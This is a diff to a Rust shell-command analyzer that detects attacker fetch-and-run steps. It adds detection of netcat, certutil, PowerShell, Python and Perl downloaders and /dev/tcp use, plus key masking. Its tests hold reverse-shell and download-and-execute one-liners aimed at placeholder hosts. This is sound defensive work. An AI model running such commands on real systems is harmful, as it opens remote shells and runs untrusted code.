@@ -9,7 +9,8 @@ use std::collections::VecDeque;
 use std::mem::take;
 
 use super::decode::{open, push_opaque};
-use super::{Budget, LayerKind, MAX_PIECES, OpaqueReason, Recipe, Span, Xray};
+use super::pieces::urls_in;
+use super::{Budget, LayerKind, MAX_PIECES, OpaqueReason, Recipe, Span, Xray, key};
 
 /// Longest token a step may keep, and the longest normal form: the piece
 /// value limit.
@@ -68,9 +69,41 @@ const CURL_VALUES: (&[u8], &[u8]) = (b"AbcCdDeEFHKmoPQrtTuUwxXyYz", b"o");
 const SCP_VALUES: (&[u8], &[u8]) = (b"cDFiJloPSX", b"");
 const TFTP_VALUES: (&[u8], &[u8]) = (b"blcmr", b"lr");
 const FTPGET_VALUES: (&[u8], &[u8]) = (b"uPp", b"");
+const NC_VALUES: (&[u8], &[u8]) = (b"pwsiqxXOIe", b"");
+const NO_VALUES: (&[u8], &[u8]) = (b"", b"");
+
+/// What code for another language says, lowercased: first that it fetches,
+/// then that it runs or saves what it fetched.
+type CodeWords = (&'static [&'static str], &'static [&'static str]);
+const PYTHON_CODE: CodeWords = (
+    &["urllib", "requests", "urlopen", "http.client", "httplib"],
+    &[
+        "exec(",
+        "eval(",
+        "urlretrieve",
+        ".write(",
+        "os.system",
+        "subprocess",
+    ],
+);
+const PERL_CODE: CodeWords = (
+    &["lwp", "http::tiny"],
+    &["getstore", "mirror", "system", "eval", "open("],
+);
+const POWERSHELL_CODE: CodeWords = (
+    &[
+        "downloadstring",
+        "downloadfile",
+        "invoke-webrequest",
+        "invoke-restmethod",
+        "iwr ",
+        "irm ",
+    ],
+    &["iex", "invoke-expression", "downloadfile", "-outfile"],
+);
 
 /// Long options of wget and curl that take the next word as their value.
-const LONG_VALUES: [&[u8]; 12] = [
+const LONG_VALUES: [&[u8]; 19] = [
     b"user-agent",
     b"header",
     b"referer",
@@ -79,6 +112,13 @@ const LONG_VALUES: [&[u8]; 12] = [
     b"connect-timeout",
     b"max-time",
     b"data",
+    b"data-raw",
+    b"data-binary",
+    b"data-urlencode",
+    b"form",
+    b"cookie",
+    b"post-data",
+    b"post-file",
     b"user",
     b"password",
     b"proxy",
@@ -675,6 +715,7 @@ struct FetchArgs<'w> {
     positional: Vec<&'w Word>,
     output: Option<&'w [u8]>,
     remote_name: bool,
+    spider: bool,
 }
 
 fn fetch_args<'w>(args: &'w [Word], (values, outputs): (&[u8], &[u8])) -> FetchArgs<'w> {
@@ -695,6 +736,7 @@ fn fetch_args<'w>(args: &'w [Word], (values, outputs): (&[u8], &[u8])) -> FetchA
                     found.output = inline.or_else(|| rest.next().map(|w| w.text.as_slice()));
                 }
                 b"remote-name" => found.remote_name = true,
+                b"spider" => found.spider = true,
                 _ if inline.is_none() && LONG_VALUES.contains(&name) => {
                     rest.next();
                 }
@@ -890,6 +932,8 @@ struct Reader<'a> {
     run_output: &'a mut Vec<usize>,
     layer: usize,
     text: &'a [u8],
+    /// Where in `text` a key sits.
+    mask: Vec<(usize, usize)>,
     lex: Lexer<'a>,
     root: Frame,
     frames: Vec<Frame>,
@@ -1016,7 +1060,50 @@ impl Reader<'_> {
         }
     }
 
+    /// The word, or one of its characters, is part of a private key.
+    fn masked(&self, word: &Word) -> bool {
+        self.mask
+            .iter()
+            .any(|&(start, end)| word.start < end && start < word.end)
+    }
+
+    /// `/dev/tcp/<host>/<port>`: a fetch by the shell itself, wherever the
+    /// word stands. Saved only by what the pipeline does with it.
+    fn dev_tcp(&mut self, word: &Word) {
+        if !word.text.starts_with(b"/dev/tcp/") && !word.text.starts_with(b"/dev/udp/") {
+            return;
+        }
+        let in_text = &self.text[word.start..word.end];
+        let Some(at) = in_text.iter().position(|&b| b == b'/') else {
+            return;
+        };
+        let start = word.start + at + b"/dev/tcp/".len();
+        let end = self.text[start.min(word.end)..word.end]
+            .iter()
+            .position(|&b| matches!(b, b'/' | b'"' | b'\''))
+            .map_or(word.end, |p| start + p);
+        if start >= end {
+            return;
+        }
+        let target = Span {
+            layer: self.layer,
+            start,
+            end,
+        };
+        self.emit(Step::Fetch {
+            tool: "tcp".to_string(),
+            target,
+            saves: false,
+        });
+        self.files.push(File {
+            target: Some(start),
+            name: None,
+            saved: false,
+        });
+    }
+
     fn word(&mut self, word: Word) {
+        self.dev_tcp(&word);
         match self.redir.take() {
             Some(Redir::Out) if is_file(&word.text) => self.cmd.out = Some(word),
             Some(Redir::Stdin { string }) => self.cmd.stdin = Some((word, string)),
@@ -1218,7 +1305,7 @@ impl Reader<'_> {
     /// The attacker's tag, when the word is a value they wrote down.
     fn tag(&mut self, word: Option<&Word>) -> Option<String> {
         let word = word.filter(|w| !w.dynamic && !w.text.is_empty())?;
-        if word.text.starts_with(b"-") {
+        if word.text.starts_with(b"-") || self.masked(word) {
             return None;
         }
         self.keep(&word.text)
@@ -1253,6 +1340,9 @@ impl Reader<'_> {
     }
 
     fn command(&mut self, head: &Word, args: &[Word], cmd: &Command) {
+        if self.masked(head) {
+            return self.emit(Step::Other(UNNAMED.to_string()));
+        }
         let name = base(&head.text);
         let out = cmd.out.as_ref();
         if let Some(sub) = head.only_substitution() {
@@ -1289,6 +1379,20 @@ impl Reader<'_> {
             b"scp" => self.fetch("scp", SCP_VALUES, args, out),
             b"tftp" => self.fetch("tftp", TFTP_VALUES, args, out),
             b"ftpget" => self.fetch("ftpget", FTPGET_VALUES, args, out),
+            b"nc" | b"ncat" | b"netcat" if !listens(args) => {
+                self.fetch("nc", NC_VALUES, args, out);
+            }
+            b"certutil" | b"certutil.exe"
+                if args
+                    .iter()
+                    .any(|w| w.text.eq_ignore_ascii_case(b"-urlcache")) =>
+            {
+                self.fetch("certutil", NO_VALUES, args, out);
+            }
+            b"powershell" | b"powershell.exe" | b"pwsh" => {
+                self.code_fetch("powershell", args, POWERSHELL_CODE);
+                self.emit(Step::Other("powershell".to_string()));
+            }
             b"[" | b"[[" | b"test" => self.status_test(args),
             b"echo" | b"printf" if out.is_some() => {
                 let data = self.literal(args);
@@ -1432,6 +1536,10 @@ impl Reader<'_> {
         if has_code {
             if shell {
                 self.open_script(&rest[..rest.len().min(1)]);
+            } else if name.starts_with(b"python") {
+                self.code_fetch("python", args, PYTHON_CODE);
+            } else if name == b"perl" {
+                self.code_fetch("perl", args, PERL_CODE);
             }
             rest = &[];
         } else if shell && what.is_none() {
@@ -1451,13 +1559,66 @@ impl Reader<'_> {
         if what.is_some() {
             rest = &rest[1..];
         }
-        let what = what
-            .filter(|_| process.is_none())
-            .map_or(name, |file| file.text.as_slice());
+        let what = match what.filter(|_| process.is_none()) {
+            Some(file) if self.masked(file) => UNNAMED.as_bytes(),
+            Some(file) => file.text.as_slice(),
+            None => name,
+        };
         let what = self.keep(what);
         let tag = self.tag(rest.last());
         if let Some(what) = what {
             self.emit(Step::Run { what, tag });
+        }
+    }
+
+    /// Code for another language, read as text only: its URLs are fetches
+    /// when it says so, and saved when it also runs or saves the result.
+    fn code_fetch(&mut self, tool: &str, words: &[Word], (fetches, runs): CodeWords) {
+        let (Some(first), Some(last)) = (words.first(), words.last()) else {
+            return;
+        };
+        let (start, end) = (first.start, last.end);
+        let mut code = self.text[start..end].to_ascii_lowercase();
+        // A URL is the target, not code: `…/system` says nothing.
+        for (from, to, _) in urls_in(&self.text[start..end]) {
+            code[from..to].fill(b' ');
+        }
+        let word_byte = |b: &u8| b.is_ascii_alphanumeric() || *b == b'_';
+        // These start a name, and `system` and `iex` also end one:
+        // `confirm x` is not `irm `, `fopen(` is not `open(`. The others
+        // are found inside `-MLWP::Simple` and `urllib2` as well.
+        let says = |list: &[&str]| {
+            list.iter().any(|word| {
+                let word = word.as_bytes();
+                let whole_start = matches!(word, b"system" | b"iex" | b"open(" | b"irm " | b"iwr ");
+                let whole_end = matches!(word, b"system" | b"iex");
+                code.windows(word.len()).enumerate().any(|(at, w)| {
+                    w == word
+                        && !(whole_start && at > 0 && word_byte(&code[at - 1]))
+                        && !(whole_end && code.get(at + word.len()).is_some_and(word_byte))
+                })
+            })
+        };
+        if !says(fetches) {
+            return;
+        }
+        let saved = says(runs);
+        for (from, to, _) in urls_in(&self.text[start..end]) {
+            let target = Span {
+                layer: self.layer,
+                start: start + from,
+                end: start + to,
+            };
+            self.emit(Step::Fetch {
+                tool: tool.to_string(),
+                target,
+                saves: false,
+            });
+            self.files.push(File {
+                target: Some(target.start),
+                name: None,
+                saved,
+            });
         }
     }
 
@@ -1499,10 +1660,24 @@ impl Reader<'_> {
                 true,
                 Some(local.text.as_slice()),
             ),
-            ("wget" | "curl", all) => (all, output.is_some() || found.remote_name, output),
+            ("certutil", [url, rest @ ..]) => (
+                std::slice::from_ref(url),
+                true,
+                rest.last().map(|w| w.text.as_slice()),
+            ),
+            ("nc", [host, ..]) => (std::slice::from_ref(host), false, None),
+            ("wget" | "curl", all) => {
+                // wget saves unless told otherwise; curl prints.
+                let by_default = tool == "wget" && found.output.is_none() && !found.spider;
+                (
+                    all,
+                    output.is_some() || found.remote_name || by_default,
+                    output,
+                )
+            }
             _ => (&[][..], false, None),
         };
-        let url_named = tool != "curl" || found.remote_name;
+        let url_named = !matches!(tool, "curl" | "nc") || found.remote_name;
         let mut any = false;
         for source in sources.iter().filter(|w| w.url_like()) {
             any = true;
@@ -1512,15 +1687,9 @@ impl Reader<'_> {
                 .filter(|name| !matches!(*name, b"" | b"."))
                 .or(url_named.then(|| url_name(&source.text)));
             let name = redirect.map_or(local, |file| Some(base(&file.text)));
-            // One URL too long to keep is no reason to stop reading.
+            // Its host is still known: only the URL is too long to keep.
             if target.end - target.start > MAX_VALUE {
                 push_opaque(self.xray, target, OpaqueReason::OverLimit);
-                self.files.push(File {
-                    target: None,
-                    name: name.map(<[u8]>::to_vec),
-                    saved: false,
-                });
-                continue;
             }
             self.emit(Step::Fetch {
                 tool: tool.to_string(),
@@ -1552,6 +1721,12 @@ fn walk(nodes: &mut [Node], visit: &mut impl FnMut(&mut Step)) {
             }
         }
     }
+}
+
+/// `nc -l`: it waits, and fetches nothing.
+fn listens(args: &[Word]) -> bool {
+    args.iter()
+        .any(|w| w.text.starts_with(b"-") && w.text.contains(&b'l'))
 }
 
 fn is_runner(what: &str) -> bool {
@@ -1605,9 +1780,16 @@ fn render(nodes: &[Node], separator: &str, out: &mut String) {
 /// Read `layer` as shell and push its recipe, then do the same for all the
 /// code inside it, each opened as a `Shell` child layer: `$( )`, backticks,
 /// `sh -c`, `eval` and heredocs to a shell. So call this on the layers around
-/// them only, not on `Shell` layers. A layer that fetches, runs or writes
-/// nothing is no recipe, and costs no steps.
-pub(crate) fn read_recipes(xray: &mut Xray, layer: usize, budget: &mut Budget) {
+/// them only, not on layers it opened. A layer that fetches, runs or writes
+/// nothing is no recipe, and costs no steps. `masks` holds the key ranges of
+/// the layers open so far: no step keeps a word overlapping one. A layer it
+/// opens itself, or one past the list, is searched for keys here.
+pub(crate) fn read_recipes(
+    xray: &mut Xray,
+    layer: usize,
+    budget: &mut Budget,
+    masks: &[Vec<(usize, usize)>],
+) {
     let mut queue = VecDeque::from([layer]);
     let mut run_output = Vec::new();
     while let Some(at) = queue.pop_front() {
@@ -1615,7 +1797,8 @@ pub(crate) fn read_recipes(xray: &mut Xray, layer: usize, budget: &mut Budget) {
             continue;
         }
         let text = take(&mut xray.layers[at].text);
-        read_layer(xray, at, &text, budget, &mut queue, &mut run_output);
+        let mask = masks.get(at).cloned().unwrap_or_else(|| key::ranges(&text));
+        read_layer(xray, at, &text, mask, budget, &mut queue, &mut run_output);
         xray.layers[at].text = text;
     }
     // Last, as the run may come after the layer holding the fetch was read.
@@ -1634,6 +1817,7 @@ fn read_layer(
     xray: &mut Xray,
     layer: usize,
     text: &[u8],
+    mask: Vec<(usize, usize)>,
     budget: &mut Budget,
     queue: &mut VecDeque<usize>,
     run_output: &mut Vec<usize>,
@@ -1646,6 +1830,7 @@ fn read_layer(
         run_output,
         layer,
         text,
+        mask,
         lex: Lexer::new(text),
         root: Frame::new(Kind::Root, Mark::default()),
         frames: Vec::new(),
@@ -1707,7 +1892,7 @@ mod tests {
 
     fn read_bytes(text: &[u8]) -> Xray {
         let mut x = Xray::new(text);
-        read_recipes(&mut x, 0, &mut Budget::default());
+        read_recipes(&mut x, 0, &mut Budget::default(), &[]);
         x
     }
 
@@ -2035,7 +2220,7 @@ mod tests {
         let body: &[u8] = b"cd /tmp; wget http://example.org/x; ./x tag";
         let mut x = Xray::new(body);
         let mut budget = Budget::default();
-        read_recipes(&mut x, 0, &mut budget);
+        read_recipes(&mut x, 0, &mut budget, &[]);
         assert_eq!(budget.steps, MAX_STEPS - 3);
         assert_eq!(budget.pieces, MAX_PIECES, "left to the piece extractor");
 
@@ -2044,7 +2229,7 @@ mod tests {
             steps: 2,
             ..Budget::default()
         };
-        read_recipes(&mut x, 0, &mut budget);
+        read_recipes(&mut x, 0, &mut budget, &[]);
         assert_eq!(steps(&only(&x).nodes).len(), 2);
         assert_eq!(budget.steps, 0);
         assert_eq!(budget.pieces, MAX_PIECES);
@@ -2053,7 +2238,7 @@ mod tests {
 
         let mut x = Xray::new(&b"wget http://example.org/x;".repeat(1000));
         let mut budget = Budget::default();
-        read_recipes(&mut x, 0, &mut budget);
+        read_recipes(&mut x, 0, &mut budget, &[]);
         assert_eq!(budget.steps, 0);
         assert_eq!(budget.pieces, MAX_PIECES, "a long recipe starves no pieces");
     }
@@ -2091,7 +2276,7 @@ mod tests {
     }
 
     #[test]
-    fn a_target_over_the_limit_is_dropped_and_reading_goes_on() {
+    fn a_target_over_the_limit_is_marked_and_reading_goes_on() {
         let long = format!("http://example.org/{}", "a".repeat(MAX_VALUE));
         let x = read(&format!(
             "cd /tmp; wget {long} -O /tmp/a; /tmp/a tag; wget http://example.org/b; rm x"
@@ -2100,13 +2285,111 @@ mod tests {
         assert!(over_limit(&x));
         assert_eq!(x.opaque[0].at.layer, 0);
         let found = steps(&only(&x).nodes);
-        assert_eq!(found.len(), 4, "{found:?}");
-        assert_eq!(*found[1], run("/tmp/a", Some("tag")));
-        assert_eq!(fetch(&x, found[2]).1, "http://example.org/b");
-        assert_eq!(*found[3], Step::Cleanup);
+        assert_eq!(found.len(), 5, "{found:?}");
+        assert_eq!(fetch(&x, found[1]).1, long);
+        assert_eq!(*found[2], run("/tmp/a", Some("tag")));
+        assert_eq!(fetch(&x, found[3]).1, "http://example.org/b");
+        assert_eq!(*found[4], Step::Cleanup);
         // The other URL of the same command is kept.
         let x = read(&format!("wget {long} http://example.org/b"));
+        assert_eq!(steps(&only(&x).nodes).len(), 2);
+    }
+
+    #[test]
+    fn option_values_of_data_are_not_targets() {
+        for opt in [
+            "--data-binary",
+            "--data-raw",
+            "--data-urlencode",
+            "--form",
+            "--cookie",
+        ] {
+            let x = read(&format!("curl {opt} 'a=b.c/d' http://example.org/x"));
+            let found = steps(&only(&x).nodes);
+            assert_eq!(found.len(), 1, "{opt}: {found:?}");
+            assert_eq!(fetch(&x, found[0]).1, "http://example.org/x");
+        }
+        let x = read("wget --post-data 'a=b.c/d' --post-file /tmp/f http://example.org/x");
         assert_eq!(steps(&only(&x).nodes).len(), 1);
+    }
+
+    #[test]
+    fn other_fetchers_are_read() {
+        let targets = |line: &str| -> Vec<(String, bool)> {
+            let x = read(line);
+            let mut all = Vec::new();
+            for recipe in &x.recipes {
+                for step in steps(&recipe.nodes) {
+                    if let Step::Fetch { .. } = step {
+                        let (_, url, saves) = fetch(&x, step);
+                        all.push((url, saves));
+                    }
+                }
+            }
+            all
+        };
+        let one = |url: &str, saves: bool| vec![(url.to_string(), saves)];
+        let py = "python3 -c \"import urllib.request as u; exec(u.urlopen('http://example.org/x').read())\"";
+        assert_eq!(targets(py), one("http://example.org/x", true));
+        let py = "python -c \"import requests; print(requests.get('http://example.org/x').text)\"";
+        assert_eq!(targets(py), one("http://example.org/x", false));
+        let py = "python -c \"print('http://example.org/x')\"";
+        assert_eq!(targets(py), []);
+        let pl = "perl -MLWP::Simple -e 'getstore(\"http://example.org/x\",\"/tmp/y\")'";
+        assert_eq!(targets(pl), one("http://example.org/x", true));
+        // Words are whole: `confirm` is not `irm `, and a URL is no code.
+        let pl = "perl -MLWP::Simple -e 'get(\"http://example.org/system\")'";
+        assert_eq!(targets(pl), one("http://example.org/system", false));
+        let pl = "perl -MLWP::Simple -e 'get(\"http://example.org/x\"); $confirm = 1; fopen(2)'";
+        assert_eq!(targets(pl), one("http://example.org/x", false));
+        let pl = "perl -MLWP::Simple -e 'get(\"http://example.org/x\"); system(1)'";
+        assert_eq!(targets(pl), one("http://example.org/x", true));
+        let ps = "powershell -c \"iwr http://example.org/x; confirm x\"";
+        assert_eq!(targets(ps), one("http://example.org/x", false));
+        let ps = "powershell -c \"iwr http://example.org/x | iex\"";
+        assert_eq!(targets(ps), one("http://example.org/x", true));
+        assert_eq!(
+            targets("cat </dev/tcp/203.0.113.9/80 | sh"),
+            one("203.0.113.9", true)
+        );
+        assert_eq!(
+            targets("bash -i >& /dev/tcp/203.0.113.9/4444 0>&1"),
+            one("203.0.113.9", false)
+        );
+        assert_eq!(
+            targets("nc -w 3 203.0.113.9 4444 | sh"),
+            one("203.0.113.9", true)
+        );
+        assert_eq!(
+            targets("nc 203.0.113.9 4444 > /tmp/x"),
+            one("203.0.113.9", true)
+        );
+        assert_eq!(targets("nc -lvp 4444 | sh"), []);
+        assert_eq!(
+            targets("certutil.exe -urlcache -split -f http://example.org/a.exe a.exe"),
+            one("http://example.org/a.exe", true)
+        );
+        let ps = "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://example.org/a.ps1')\"";
+        assert_eq!(targets(ps), one("http://example.org/a.ps1", true));
+        let ps =
+            "powershell -c \"(New-Object Net.WebClient).DownloadString('http://example.org/a')\"";
+        assert_eq!(targets(ps), one("http://example.org/a", false));
+    }
+
+    #[test]
+    fn no_step_keeps_a_word_inside_a_key() {
+        let line = "abcdefghijkl";
+        let text = format!(
+            "foo -----BEGIN X PRIVATE KEY-----\n{line}\nsh /tmp/{line} {line}\n\
+             -----END X PRIVATE KEY-----\n/tmp/x tag"
+        );
+        let x = read(&text);
+        let recipe = only(&x);
+        assert!(!format!("{:?}", recipe).contains(line), "{recipe:?}");
+        assert_eq!(
+            *steps(&recipe.nodes).last().unwrap(),
+            &run("/tmp/x", Some("tag"))
+        );
     }
 
     #[test]
@@ -2120,8 +2403,14 @@ mod tests {
             saved("curl http://example.org/x > /dev/null 2>/tmp/err"),
             [false]
         );
-        assert_eq!(saved("wget http://example.org/x; ./y"), [false]);
+        assert_eq!(saved("wget --spider http://example.org/x; ./y"), [false]);
+        assert_eq!(saved("wget -O- http://example.org/x | grep a"), [false]);
         // Written.
+        assert_eq!(
+            saved("cd /var/www/html; wget http://example.org/s.php"),
+            [true]
+        );
+        assert_eq!(saved("wget http://example.org/x; ./y"), [true]);
         assert_eq!(saved("wget -O /tmp/a http://example.org/x"), [true]);
         assert_eq!(saved("wget -qO/tmp/a http://example.org/x"), [true]);
         assert_eq!(
@@ -2295,7 +2584,7 @@ mod tests {
         }
         let mut x = Xray::new(&b"word another\n".repeat(400));
         let mut budget = Budget::default();
-        read_recipes(&mut x, 0, &mut budget);
+        read_recipes(&mut x, 0, &mut budget, &[]);
         assert_eq!(budget.steps, MAX_STEPS, "nothing kept, nothing spent");
         assert!(over_limit(&x), "reading still stopped, so it says so");
     }
@@ -2561,7 +2850,7 @@ mod tests {
         );
         assert_eq!(all_saved(&x), [true]);
         // Empty substitutions print nothing, and are no layer to find.
-        let x = read("wget http://example.org/x; $()");
+        let x = read("curl http://example.org/x; $()");
         assert_eq!(all_saved(&x), [false]);
         // The output goes somewhere that is no shell.
         for line in [
@@ -2604,7 +2893,7 @@ mod tests {
         );
         // Only stdin counts: not another descriptor.
         assert_eq!(
-            all_saved(&read("wget http://example.org/x; sh 3< x")),
+            all_saved(&read("wget --spider http://example.org/x; sh 3< x")),
             [false]
         );
     }
